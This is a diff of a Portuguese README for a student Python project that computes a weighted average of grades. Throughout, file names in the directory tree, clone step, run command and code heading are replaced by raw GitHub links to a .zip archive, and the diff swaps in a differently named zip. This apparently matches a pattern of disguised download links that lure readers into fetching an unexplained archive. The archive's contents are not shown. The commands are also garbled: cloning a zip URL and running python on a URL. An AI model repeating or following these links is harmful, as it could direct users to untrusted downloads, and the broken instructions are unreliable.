@@ -11,9 +11,9 @@ O projeto está organizado da seguinte forma:
 ```
 .
 ├── Q1/
-│   └── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip        # Arquivo principal contendo a função de média ponderada.
+│   └── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip        # Arquivo principal contendo a função de média ponderada.
 ├── .gitignore        # Define arquivos e pastas a serem ignorados pelo Git (ex: .env, __pycache__, .vscode).
-└── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip        
+└── https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip        
 ```
 
 ### ⚙️ Como Executar
@@ -23,14 +23,14 @@ Para executar o script Python, você precisa ter o **Python 3** instalado.
 1.  **Clone o repositório:**
 
     ```bash
-    git clone https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip
+    git clone https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip
     cd prova_engenharia_software/Q1
     ```
 
-2.  **Execute o arquivo `https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip`:**
+2.  **Execute o arquivo `https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip`:**
 
     ```bash
-    python https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip
+    python https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip
     ```
 
 #### Exemplo de Saída Esperada:
@@ -40,7 +40,7 @@ Notas do Aluno: [7.0, 8.5, 9.0], Pesos: [1, 3, 5]
 A média ponderada correta é: 8.50
 ```
 
-### 💻 Código Principal (`https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software_prova_engenharia_2.2.zip`)
+### 💻 Código Principal (`https://raw.githubusercontent.com/devwarly/prova_engenharia_software/master/Q1/software-prova-engenharia-otherist.zip`)
 
 O arquivo principal define a função `calcular_media_ponderada(notas, pesos)`.
 
